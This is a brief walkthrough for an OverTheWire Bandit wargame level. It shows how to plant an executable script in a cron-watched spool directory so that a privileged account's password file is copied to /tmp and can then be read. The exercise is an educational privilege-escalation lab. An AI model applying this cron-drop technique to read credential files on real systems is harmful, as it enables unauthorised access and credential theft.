OverTheWire Bandit: Level 23 → 24

Objective
Obtain the password for Level 24.
A cron job executes scripts placed in a specific directory. Any executable script placed there will run automatically.

Steps
Log in as bandit23:
ssh bandit23@bandit.labs.overthewire.org -p 2220
Review the cron job configuration:
cat /etc/cron.d/cronjob_bandit24
Inspect the executed script:
cat /usr/bin/cronjob_bandit24.sh
Create a script that copies the password to a readable location:
echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass" > /var/spool/bandit24/foo.sh
chmod +x /var/spool/bandit24/foo.sh
Wait for the cron job to run, then read the file:
cat /tmp/bandit24_pass

Result
The file contains the password for Bandit Level 24.
